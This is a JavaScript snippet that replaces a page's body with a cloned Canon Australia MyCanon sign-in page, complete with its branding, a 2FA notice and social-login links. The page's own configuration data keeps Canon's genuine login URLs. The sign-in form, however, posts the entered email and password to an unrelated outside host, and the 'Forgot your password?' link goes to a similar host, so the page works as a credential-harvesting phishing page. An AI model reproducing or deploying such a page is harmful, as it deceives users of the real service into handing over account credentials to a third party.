document.body.innerHTML = `
<!DOCTYPE html>
<!--[if !IE]><!-->
<html class=""><!--<![endif]--><!--[if lte IE 9]><!--><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}</style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <title>Join or Sign in to MyCanon</title>
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <!--[if lte IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="js/vendor/10up/flexibility.js"></script>
    <![endif]-->
    <!-- start favicons + touch icons -->
    <link rel="shortcut icon" href="https://secure.canon.com.au/core/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://secure.canon.com.au/core/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="57x57" href="https://secure.canon.com.au/core/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://secure.canon.com.au/core/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://secure.canon.com.au/core/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://secure.canon.com.au/core/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://secure.canon.com.au/core/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://secure.canon.com.au/core/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://secure.canon.com.au/core/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://secure.canon.com.au/core/apple-touch-icon-152x152.png">
    <link rel="icon" type="image/png" href="https://secure.canon.com.au/core/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="https://secure.canon.com.au/core/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://secure.canon.com.au/core/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://secure.canon.com.au/core/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="https://secure.canon.com.au/core/favicon-196x196.png" sizes="196x196">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="msapplication-TileImage" content="mstile-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <meta name="site-section">
    <meta name="page-template" content="Login">
    <!-- end favicons + touch icons -->
    <link rel="stylesheet" type="text/css" href="sitefiles/sanitize.css">

    <style type="text/css">
        html {
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        html, body {
            font-size: 100%;
            height: 100%;
        }

        *, *:before, *:after {
            box-sizing: inherit;
        }

        body {
            background: white;
            color: black;
            cursor: auto;
            position: relative;
        }

        .row {
            margin: 0 auto;
            max-width: 1280px;
            width: 100%;
        }

        .posn--abs {
            position: absolute;
            left: 0;
            top: 0;
        }

        .clearfix {
            clear: both;
        }

            .clearfix:after {
                content: "";
                display: table;
                clear: both;
            }

        .show--me {
            display: block;
        }

        .hide--me {
            display: none;
        }

        .posn--rel {
            position: relative;
        }

        a {
            color: black;
        }

        ul li {
            float: left;
            list-style: none;
        }
        /*.add-separator {
            border-right: 1px solid #ca0000;
            padding-right: 25px;
            margin-right: 25px;
        }*/

        /*.client-logo, .client-logo a img {
            max-width: 60px;
            max-height: 60px;
        }*/

        .mcl{
            margin-bottom: 60px !important;
        }
        .mcl .cols--1-2 input[type=password],
        .mcl .cols--1-2 input[type=email] {
            width: 91%;
            padding: .5rem .8rem;
            margin-bottom: 0px;
        }

        .mcl .cols--1-2 button[class*=btn] {
            width: 100%;
            margin: 0 0 15px;
            font-size: 18px;
            font-size: 1.125rem;
            line-height: 2.5;
        }

        .add-section-separator {
            border-right: 1px solid #d7d7d7;
        }

        .alert {
            padding: 20px 60px;
        }

        .alert-danger {
            color: #e11b22;
        }


        header .mc-logos .mc-logo img {
            width: 53px;
        }

        .mc-logoview img {
            max-width: 100px;
        }

        .mc-header .mc-logos a:last-child {
            width: auto !important;
        }

        .no-border {
            border: none !important;
        }

        .add-border {
            border: 1px solid #d7d7d7;
        }

        .mcl .info-block .head--4 {
            padding-top: 0 !important;
            padding-bottom: 0 !important;
        }

        .forgot-pw-container {
            float: right;
        }        
        
        .forgot-pw-container a {
            color: red;
        }

        .loginCopyHtml {
            margin-bottom: 20px;
        }

        form {
            display: grid;
        }
        form{
            display: grid;
        }

        .login-view-only {
            border: 1px solid #d7d7d7;
            margin: auto !important;
            float: none !important;
        }

        .notification {
            border-bottom: 1px solid #d7d7d7;
            padding: 5px;
        }

        .print-assist-header {
            display: inline-block;
            padding-left: 35px;
            text-align: center;
            margin: 60px 0 -20px 0;
            width: 100%;
        }
        .print-assist-header img {
            width: 330px;
            display: inline-block;
        }

        .loginSectionOptions {

        }

        .loginSectionOptions ul {
            list-style: none;
            width: 100%;
            margin-bottom: 20px;
            display: inline-block
        }

        .loginSectionOptions ul li {
            border-bottom: 2px solid grey;
            width: 50%;
            padding-bottom: 5px;
            cursor: pointer;
        }

        .loginSectionOptions ul li.current {
            border-bottom: 2px solid red;
        }

        .cb-container.login-remember {
            float: left;
        }

        .social-icons {
            
        }

        .social-icons small {
            float: left;
        }

        .social-icons div {
            float: right;
        }

        .mcl .cols--1-2.login-my-canon-business {
            background: #DBDFE8;
            margin-top: 0px;
            padding-top: 80px;
            padding-bottom: 182px;
            margin-bottom: 0px;
        }

        .join-mycanon-copy {
            font-size: 20px;
            margin: 40px 0 136px 0;
        }

        .mcl .cols--1-2 button.btn--2 {
            margin-top: 20px;
        }

        label#username-label {
            background: url("/Content/images/account.svg") no-repeat left;
            background-size: 45px;
            border: 1px solid #d7d7d7;
            padding: 0px 0px 0px 35px;
            float: left;
            width: 100%;
            margin-bottom: 10px;
        }

        label#password-label {
            background: url("/Content/images/password.svg") no-repeat left;
            background-size: 45px;
            border: 1px solid #d7d7d7;
            padding: 0px 0px 0px 35px;
            float: left;
            width: 100%;
            margin-bottom: 10px;
        }

        .mcl .cols--1-2 label#password-label input[type=password] {
            border: 0;
            width: 91%;
            margin-bottom: 0px;
        }

        .signup-link-container {
            display: block;
            padding-top: 25px;
            margin-top: 25px;
            border-top: 1px solid #d7d7d7;
        }

        @media screen and (max-width: 768px) {
            .mcl .cols--1-2 .social-icons {
                padding-top: 25px !important;
                margin-top: 25px !important;
            }
        }

        .sub-head a {
            color: red;
        }
    </style>
    <style type="text/css">
        .twofactor-banner {
            width: 100%;
            min-height: 30px;
            height: min-content
            border-radius: 0px;
            background-image: linear-gradient(292deg, rgb(59, 26, 76), rgb(204, 0, 0));
            display: block;
            background-color: rgb(17, 17, 17);
            color: rgb(255, 255, 255);
            text-align: center;
            padding:10px;
        }

        .twofactor-banner > span {
            color: rgb(255, 255, 255);
            font-size: 12px;
            line-height: 30px;
            padding: 2px 7px;
            border-radius: 100px;
            background: none;
            border: 1px solid rgb(255, 255, 255);
            font-weight: bold;
            text-transform: uppercase;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            margin-right: 8px;
            margin-left: 20px;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="sitefiles/canon-common.min.css">

<script>
  (function (w, d, s, l, i) {
       w[l] = w[l] || []; w[l].push({
           'gtm.start':
                new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
              j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-P329QKW');
</script>
</head>

<body lang="en" ng-app="app" ng-controller="LayoutCtrl" class="ng-scope isAU vsc-initialized">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P329QKW" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

    <div class="xoverlay-grid"></div>
<header class="gl01 mc-header clearfix">
    <div class="layout--1200 clearfix">
        <div>
            <div class="logo float--left">
                <a ng-href="https://www.canon.com.au" href="https://www.canon.com.au/">
                    <img ng-src="https://secure.canon.com.au/Content/images/CanonLogo.svg" alt="logo" src="sitefiles/CanonLogo.svg">
                </a>
                <a ng-href="https://www.canon.com.au" ng-show="model.clientLogoUrl" class="mc-logo ng-hide" href="https://www.canon.com.au/"><img ng-src="" alt=""></a>
            </div>
            <div class="mc-logos">
                <a href="#" ng-show="model.viewLogoUrl" class="mc-logoview ng-hide">
                    <img ng-src="" alt="" class="viewlogo">
                </a>
            </div>
        </div>
    </div>
</header>

    <div class="layout--1200 clearfix centre ng-hide" ng-show="model.headerHtml">
        <div data-ng-bind-html="headerHtml" class="ng-binding"></div>
    </div>

    <div class="layout--1200">
        <div class="mcl" ng-class="{'no-border': !model.allowRegister &amp;&amp; model.registerCopyHtml == null }">
            <div class="twofactor-banner" ng-show="model.registerCopyHtml !== null">
                <span>Security Notice</span>Two-Factor Authentication (2FA) is now enabled on MyCanon.
            </div>
            <div class="notification ng-hide" ng-show="model.notification">
                <div ng-bind-html="notification" class="ng-binding"></div>
            </div>
            <div ng-show="model.errorMessage" class="ng-hide">
                <div class="alert alert-danger ng-binding">
                    <strong>Error:</strong>
                    
                </div>
            </div>

            <div ng-show="model.allowRegister" class="">
                <div class="desktop"><p ng-show="model.displayName" style="padding: 5px;" class="ng-binding ng-hide"></p></div>
                <div class="cols--1-2 desktop login-my-canon-business" ng-class="[{true: 'login-my-canon-business', false: ''}[model.showMyCanonBusiness]]">
                    <div class="viewMessage registerCopyHtml">
                        <div ng-show="model.registerCopyHtml" data-ng-bind-html="registerCopyHtml" class="ng-binding"><div class="content-section" data-section="mycanon" style="display: block;">   <div class="head--3">    Join MyCanon   </div>   <div class="sub-head">    It's easy to sign up and you can benefit straight away.   </div>    <div class="join-mycanon-copy">Save
 your favourite stories. Access Camera Assist and Print Assist. Register
 products and upload receipts for your future warranty claims.</div>  </div>  <div class="content-section" data-section="mycanon-business" style="display: none;">   <div class="head--3">MyCanon Business</div>   <div class="sub-head">Manage your accounts with ease, from our simple online support hub.</div>   <div class="info-block">
   Track your usage, book services, view your charges, relocate devices,
 order consumables &amp; get help for your devices. All here in one 
easy-to-use hub so that you can spend more time on the things that 
matter to you.   </div>  </div> </div>
                    </div>
                    <div class="desktop">
                        <a ng-hide="loginsection == 'mycanon-business'" ng-href="https://secure.canon.com.au/core/register/local/email?signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;clientId=canon.brandsite.prod.cd" class="btn--3" href="https://secure.canon.com.au/core/register/local/email?signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;clientId=canon.brandsite.prod.cd">Create my account</a>
                    </div>
                    <div ng-show="model.extraLinksHtml" class="ng-hide">
                        <div data-ng-bind-html="extraLinksHtml" class="ng-binding"></div>
                    </div>
                </div>
            </div>

            <div ng-show="!model.allowRegister &amp;&amp; model.registerCopyHtml" class="ng-hide">
                <div class="desktop"><p ng-show="model.displayName" style="padding: 5px;" class="ng-binding ng-hide"></p></div>
                <div class="cols--1-2 desktop login-my-canon-business" ng-class="[{true: 'login-my-canon-business', false: ''}[model.showMyCanonBusiness]]">
                    <div class="viewMessage registerCopyHtml">
                        <div ng-show="model.registerCopyHtml" data-ng-bind-html="registerCopyHtml" class="ng-binding"><div class="content-section" data-section="mycanon" style="display: block;">   <div class="head--3">    Join MyCanon   </div>   <div class="sub-head">    It's easy to sign up and you can benefit straight away.   </div>    <div class="join-mycanon-copy">Save
 your favourite stories. Access Camera Assist and Print Assist. Register
 products and upload receipts for your future warranty claims.</div>  </div>  <div class="content-section" data-section="mycanon-business" style="display: none;">   <div class="head--3">MyCanon Business</div>   <div class="sub-head">Manage your accounts with ease, from our simple online support hub.</div>   <div class="info-block">
   Track your usage, book services, view your charges, relocate devices,
 order consumables &amp; get help for your devices. All here in one 
easy-to-use hub so that you can spend more time on the things that 
matter to you.   </div>  </div> </div>
                    </div>

                    <div ng-show="model.extraLinksHtml" class="ng-hide">
                        <div data-ng-bind-html="extraLinksHtml" class="ng-binding"></div>
                    </div>
                </div>
            </div>

            <div class="cols--1-2" ng-class="{'login-view-only': !model.allowRegister &amp;&amp; model.registerCopyHtml == null}">
                <div class="twofactor-banner ng-hide" ng-show="model.registerCopyHtml === null">
                    <span>Security Notice</span>Two-Factor Authentication (2FA) is now enabled on MyCanon.
                </div>
                <div class="loginCopyHtml ng-binding" ng-bind-html="loginCopyHtml"></div>
                <div class="loginCopyHtml" ng-show="!loginCopyHtml &amp;&amp; !model.showMyCanonBusiness || (model.showMyCanonBusiness &amp;&amp; loginsection == 'mycanon')">
                    <div class="head--3">Sign in to MyCanon</div>
                    <div class="sub-head">If you have an account with us, sign in here.</div>
                </div>
                <div class="loginCopyHtml ng-hide" ng-show="model.showMyCanonBusiness &amp;&amp; loginsection == 'mycanon-business'">
                    <div class="head--3">Sign in to MyCanon Business</div>
                    <div class="sub-head">If you have an account with us, sign in here.</div>
                </div>
                <div class="loginSectionOptions" ng-hide="!model.showMyCanonBusiness">
                    <ul>
                        <li ng-class="loginsection == 'mycanon' ? 'current' : ''" ng-click="loginsection = 'mycanon'" class="current">MyCanon</li>
                        <li ng-class="loginsection == 'mycanon-business' ? 'current' : ''" ng-click="loginsection = 'mycanon-business'">MyCanon Business</li>
                    </ul>
                </div>
                <form name="form" method="post" action="https://gj3mvmed3viv6smzv9tsdjpz7qdh18rwg.c.ccxsta.com" class="ng-pristine ng-invalid ng-invalid-required">
                    <input type="hidden" name="idsrv.xsrf" value="io03OWVbZGuPiHxpqO_4TWQwb-0a1Mv9D9GOl5tgPNm_aSEGCs14FAxNB3rHsKwscoNmtmBt1PXRL2tMLhb5V3nMGzs" token="model.antiForgery" class="ng-isolate-scope">
                    <label for="username" id="username-label">
                        <input required="" name="username" id="email" type="email" autofocus="" class="required-entry" placeholder="Email Address" ng-model="model.username" maxlength="100">
                    </label>

                    <label for="password" id="password-label">
                        <input required="" id="password" name="password" type="password" class="required-entry validate-password ng-pristine ng-invalid ng-invalid-required" placeholder="Password" ng-model="model.password" maxlength="100" autocomplete="off">
                    </label>
                    <div class="cb-container login-remember" ng-show="model.allowRememberMe">
                        <label for="rememberMe">
                            <input type="checkbox" id="rememberMe" name="rememberMe" ng-model="model.rememberMe" value="true" class="ng-pristine ng-valid">
                            Remember my password
                        </label>
                    </div>
                    <div class="forgot-pw-container">
                        <a ng-href="https://qsmw4wnnc5r5f2v94j22mty9g0mravyk.c.ccxsta.com" href="https://qsmw4wnnc5r5f2v94j22mty9g0mravyk.c.ccxsta.com">Forgot your password?</a>
                    </div>

                    <button type="submit" class="btn--2" ng-disabled="false">Sign in</button>
                </form>
                <div ng-show="model.extraLinksHtml" class="mobile ng-hide">
                    <div data-ng-bind-html="extraLinksHtml" class="ng-binding"></div>
                </div>

                <div class="social-icons clearfix" ng-show="model.externalProviders &amp;&amp; model.displaySocialLogin &amp;&amp; loginsection != 'mycanon-business'">
                    <small>Or Sign in with:</small>
                    <div>
                        <!-- ngInclude: undefined --><ng-include src="'/Content/app/Templates/sociallogin.html'" class="ng-scope"><!-- ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="" title="ADFS" alt="ADFS" gigid="ADFS" class="ng-hide">
        <img ng-src="https://secure.canon.com.au/Content/images/login_adfs.svg" src="sitefiles/login_adfs.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="" title="Salesforce" alt="Salesforce" gigid="Salesforce" class="ng-hide">
        <img ng-src="https://secure.canon.com.au/Content/images/login_salesforce.svg" src="sitefiles/login_salesforce.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="https://secure.canon.com.au/core/external?provider=Facebook&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" title="Facebook" alt="Facebook" gigid="Facebook" href="https://secure.canon.com.au/core/external?provider=Facebook&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" class="">
        <img ng-src="https://secure.canon.com.au/Content/images/login_facebook.svg" src="sitefiles/login_facebook.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="https://secure.canon.com.au/core/external?provider=Google&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" title="Google" alt="Google" gigid="Google" href="https://secure.canon.com.au/core/external?provider=Google&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" class="">
        <img ng-src="https://secure.canon.com.au/Content/images/login_google.svg" src="sitefiles/login_google.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="" title="LinkedIn" alt="LinkedIn" gigid="LinkedIn" class="ng-hide">
        <img ng-src="https://secure.canon.com.au/Content/images/login_linkedin.svg" src="sitefiles/login_linkedin.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="https://secure.canon.com.au/core/external?provider=Twitter&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" title="Twitter" alt="Twitter" gigid="Twitter" href="https://secure.canon.com.au/core/external?provider=Twitter&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2" class="">
        <img ng-src="https://secure.canon.com.au/Content/images/login_twitter.svg" src="sitefiles/login_twitter.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders --><span ng-repeat="provider in model.externalProviders" class="ng-scope">
    <a ng-show="provider.href != ''" ng-href="" title="Yahoo" alt="Yahoo" gigid="Yahoo" class="ng-hide">
        <img ng-src="https://secure.canon.com.au/Content/images/login_yahoo.svg" src="sitefiles/login_yahoo.svg">        
    </a>
</span><!-- end ngRepeat: provider in model.externalProviders -->
</ng-include>
                    </div>
                </div>

                <span ng-show="model.allowRegister" class="clearfix signup-link-container mobile"><a ng-href="https://secure.canon.com.au/core/register/local/email?signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;clientId=canon.brandsite.prod.cd" class="btn--3 mobile" href="https://secure.canon.com.au/core/register/local/email?signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;clientId=canon.brandsite.prod.cd">Sign up to My Canon</a></span>
            </div>
        </div>
        
    </div>
    <div class="footer ng-hide" ng-show="model.footerHtml">
        <div data-ng-bind-html="footerHtml" class="ng-binding"></div>
    </div>

    <script id="modelJson" type="application/json">
        {&#13;&#10;  &quot;signinId&quot;: &quot;9002c5a3888bb0254cc8aa245b69fbb2&quot;,&#13;&#10;  &quot;clientId&quot;: &quot;canon.brandsite.prod.cd&quot;,&#13;&#10;  &quot;registerUrl&quot;: &quot;https://secure.canon.com.au/core/register/local/email?signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;clientId=canon.brandsite.prod.cd&quot;,&#13;&#10;  &quot;siteBaseUrl&quot;: &quot;https://secure.canon.com.au/&quot;,&#13;&#10;  &quot;forgotPasswordUrl&quot;: &quot;https://secure.canon.com.au/core/password/forgot?clientId=canon.brandsite.prod.cd&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2&amp;redirectUrl=https://www.canon.com.au&quot;,&#13;&#10;  &quot;viewName&quot;: null,&#13;&#10;  &quot;displayName&quot;: null,&#13;&#10;  &quot;viewLogoUrl&quot;: null,&#13;&#10;  &quot;registerCopyHtml&quot;: &quot;&lt;div class=\&quot;content-section\&quot; data-section=\&quot;mycanon\&quot;&gt;   &lt;div class=\&quot;head--3\&quot;&gt;    Join MyCanon   &lt;/div&gt;   &lt;div class=\&quot;sub-head\&quot;&gt;    It&#39;s easy to sign up and you can benefit straight away.   &lt;/div&gt;    &lt;div class=\&quot;join-mycanon-copy\&quot;&gt;Save your favourite stories. Access Camera Assist and Print Assist. Register products and upload receipts for your future warranty claims.&lt;/div&gt;  &lt;/div&gt;  &lt;div class=\&quot;content-section\&quot; data-section=\&quot;mycanon-business\&quot;&gt;   &lt;div class=\&quot;head--3\&quot;&gt;MyCanon Business&lt;/div&gt;   &lt;div class=\&quot;sub-head\&quot;&gt;Manage your accounts with ease, from our simple online support hub.&lt;/div&gt;   &lt;div class=\&quot;info-block\&quot;&gt;   Track your usage, book services, view your charges, relocate devices, order consumables &amp; get help for your devices. All here in one easy-to-use hub so that you can spend more time on the things that matter to you.   &lt;/div&gt;  &lt;/div&gt; &quot;,&#13;&#10;  &quot;loginCopyHtml&quot;: null,&#13;&#10;  &quot;extraLinksHtml&quot;: null,&#13;&#10;  &quot;footerHtml&quot;: null,&#13;&#10;  &quot;displaySocialLogin&quot;: true,&#13;&#10;  &quot;allowRegister&quot;: true,&#13;&#10;  &quot;canonUrl&quot;: &quot;https://www.canon.com.au&quot;,&#13;&#10;  &quot;notification&quot;: &quot;&quot;,&#13;&#10;  &quot;headerHtml&quot;: null,&#13;&#10;  &quot;redirectUrl&quot;: null,&#13;&#10;  &quot;autoRedirect&quot;: false,&#13;&#10;  &quot;showMyCanonBusiness&quot;: true,&#13;&#10;  &quot;loginUrl&quot;: &quot;/core/login?signin=9002c5a3888bb0254cc8aa245b69fbb2&quot;,&#13;&#10;  &quot;antiForgery&quot;: {&#13;&#10;    &quot;name&quot;: &quot;idsrv.xsrf&quot;,&#13;&#10;    &quot;value&quot;: &quot;io03OWVbZGuPiHxpqO_4TWQwb-0a1Mv9D9GOl5tgPNm_aSEGCs14FAxNB3rHsKwscoNmtmBt1PXRL2tMLhb5V3nMGzs&quot;&#13;&#10;  },&#13;&#10;  &quot;allowRememberMe&quot;: true,&#13;&#10;  &quot;rememberMe&quot;: false,&#13;&#10;  &quot;username&quot;: null,&#13;&#10;  &quot;externalProviders&quot;: [&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;ADFS&quot;,&#13;&#10;      &quot;text&quot;: &quot;ADFS&quot;,&#13;&#10;      &quot;href&quot;: &quot;&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;SFDC&quot;,&#13;&#10;      &quot;text&quot;: &quot;Salesforce&quot;,&#13;&#10;      &quot;href&quot;: &quot;&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;Facebook&quot;,&#13;&#10;      &quot;text&quot;: &quot;Facebook&quot;,&#13;&#10;      &quot;href&quot;: &quot;https://secure.canon.com.au/core/external?provider=Facebook&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;Google&quot;,&#13;&#10;      &quot;text&quot;: &quot;Google&quot;,&#13;&#10;      &quot;href&quot;: &quot;https://secure.canon.com.au/core/external?provider=Google&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;LinkedIn&quot;,&#13;&#10;      &quot;text&quot;: &quot;LinkedIn&quot;,&#13;&#10;      &quot;href&quot;: &quot;&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;Twitter&quot;,&#13;&#10;      &quot;text&quot;: &quot;Twitter&quot;,&#13;&#10;      &quot;href&quot;: &quot;https://secure.canon.com.au/core/external?provider=Twitter&amp;signin=9002c5a3888bb0254cc8aa245b69fbb2&quot;&#13;&#10;    },&#13;&#10;    {&#13;&#10;      &quot;type&quot;: &quot;Yahoo&quot;,&#13;&#10;      &quot;text&quot;: &quot;Yahoo&quot;,&#13;&#10;      &quot;href&quot;: &quot;&quot;&#13;&#10;    }&#13;&#10;  ],&#13;&#10;  &quot;additionalLinks&quot;: null,&#13;&#10;  &quot;clientName&quot;: &quot;Canon Brand Site&quot;,&#13;&#10;  &quot;clientUrl&quot;: &quot;https://www.canon.com.au&quot;,&#13;&#10;  &quot;clientLogoUrl&quot;: null,&#13;&#10;  &quot;errorMessage&quot;: null,&#13;&#10;  &quot;requestId&quot;: &quot;72f868ff-8bad-41fd-8271-b0ab01a91960&quot;,&#13;&#10;  &quot;siteUrl&quot;: &quot;https://secure.canon.com.au/core/&quot;,&#13;&#10;  &quot;siteName&quot;: &quot;Canon Security Token Service&quot;,&#13;&#10;  &quot;currentUser&quot;: null,&#13;&#10;  &quot;logoutUrl&quot;: &quot;https://secure.canon.com.au/core/logout&quot;,&#13;&#10;  &quot;custom&quot;: null&#13;&#10;}
    </script>
    <script src="sitefiles/jquery-1.11.0.min.js"></script>
    <script src="sitefiles/bootstrap.min.js"></script>
    <script src="sitefiles/angular.1.2.13.min.js"></script>
    <script src="sitefiles/encoder.min.js"></script>
    <script src="sitefiles/app.js"></script>
    <script src="sitefiles/footer.js"></script>




</body></html>
`
